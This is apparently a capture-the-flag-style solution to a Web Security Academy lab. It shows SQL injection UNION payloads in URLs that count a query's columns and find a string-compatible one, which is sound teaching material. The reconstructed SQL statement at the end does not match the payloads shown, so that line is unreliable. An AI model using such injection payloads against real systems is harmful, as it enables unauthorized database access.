# Lab: SQL injection UNION attack, finding a column containing text
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

## Solution
As first we must determine how many columns the table has. So like in the last lab we union the columns with null:
```
https://0a4500130339e8668128989c003400f3.web-security-academy.net/filter?category=Gifts%27+union%20select+null,null,null+--+
```
In this query we have no error. This tells us, that we have three columns.

To determine the column with a strings type we replace the `NULL` with a random picked string:
```
https://0a4500130339e8668128989c003400f3.web-security-academy.net/filter?category=Gifts%27+union%20select+%27a%27,null,null+--+
```
This gives us again an 'Internal Server Error'.

```
https://0a4500130339e8668128989c003400f3.web-security-academy.net/filter?category=Gifts%27+union%20select+null,%27a%27,null+--+
```
This shows a correct response with our choosen column name. So the second column uses the string data type.

To solve this lab we have to show up a given random value on the website. For this we can just add the value to the found string column:
```
https://0a4500130339e8668128989c003400f3.web-security-academy.net/filter?category=Gifts%27+union%20select+null,%27iKjUzD%27,null%20--+
```

This will create the following SQL statement
```sql
SELECT name, description FROM products WHERE category = 'Accessories' UNION SELECT NULL,'iKjUzD',NULL --
```

And the challenge is solved.
